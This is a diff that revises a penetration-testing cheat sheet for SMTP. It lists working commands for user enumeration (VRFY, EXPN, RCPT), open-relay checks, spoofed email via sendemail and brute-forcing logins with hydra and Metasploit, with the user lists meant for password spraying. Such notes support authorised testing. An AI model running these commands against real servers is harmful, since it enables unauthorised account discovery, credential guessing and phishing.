@@ -1,70 +1,53 @@
-```table-of-contents
-```
+# SMTP (25, 465, 587)
 
 !!! tip "Start here"
-    Enumerate users via VRFY: `smtp-user-enum -M VRFY -U users.txt -t <target>`. If VRFY is disabled, try EXPN or RCPT TO. User enumeration gives you a valid username list for password spraying against other services (SMB, WinRM, RDP).
+    Enumerate users via VRFY: `smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10`. If VRFY is disabled, try EXPN or RCPT TO. A valid username list from SMTP is useful for password spraying against SMB, WinRM, and RDP.
+
+---
 
 ## Enumeration
-### Banner Grabbing
-```bash
-nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay <target-ip>
-```
 
 ```bash
-nc -nv <target-ip> <25,587>
+nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay 10.10.10.10
+nc -nv 10.10.10.10 25
 ```
 
-Cross reference the version for vulnerabilities in exploit-DB.
+---
 
-## Enumerate SMTP Users
+## User Enumeration
+
 ```bash
-nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN} <target-ip>
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 10.10.10.10
+smtp-user-enum -M RCPT -U users.txt -t 10.10.10.10
 ```
 
-- **VRFY**: Verify if a user exists.
-- **EXPN**: Expand mailing lists, potentially revealing email addresses.
+Via Nmap:
 
-Metasploit:
 ```bash
-msfconsole
-use auxiliary/scanner/smtp/smtp_enum
-set RHOSTS <target-ip>
-run
+nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} 10.10.10.10
 ```
 
-## Open Relaying (Unauthenticated Email Sending)
+---
+
+## Open Relay Check
+
 ```bash
-nmap --script smtp-open-relay -p 25,465,587 <target-ip>
+nmap -p 25,465,587 --script smtp-open-relay 10.10.10.10
 ```
 
-## Brute-Force SMTP Authentication
+If an open relay is confirmed, send a spoofed email:
+
 ```bash
-hydra -L users.txt -P passwords.txt -s 25 <target-ip> smtp
+sendemail -f spoofed@example.com -t victim@target.com -s 10.10.10.10:25 -u "Test" -m "Message body"
 ```
 
-Metasploit:
+---
+
+## Brute Force
+
 ```bash
-msfconsole
-use auxiliary/scanner/smtp/smtp_login
-set RHOSTS <target-ip>
-set USER_FILE users.txt
-set PASS_FILE passwords.txt
-run
+hydra -L users.txt -P passwords.txt smtp://10.10.10.10
 ```
 
-## SMTP Open Relay
-An **Open Relay** allows sending email from any domain without authentication. Attackers commonly exploit this to send spam, phishing emails, or spoof messages.
-```bash
-nmap -p25 --script smtp-open-relay <target-ip>
-```
-
-## Exploiting Misconfigurations
-If you confirm an open relay exists, you can send spoofed emails using command-line tools:
-Using `sendemail`:
-```bash
-sendemail -f spoofed@example.com -t victim@target.com -s <target-ip>:25 -u "Subject Here" -m "Your message here."
-```
-
-- `-f`: Sender email address (spoofed).
-- `-t`: Recipient.
-- `-s`: SMTP server IP and port.
+!!! tip "Real-world"
+    SMTP user enumeration is a solid early step — VRFY and EXPN are often left enabled on internal mail servers. An open relay is worth documenting as a finding even if you don't exploit it; it's straightforwardly demonstrable (send a spoofed email) and clients understand the risk immediately.
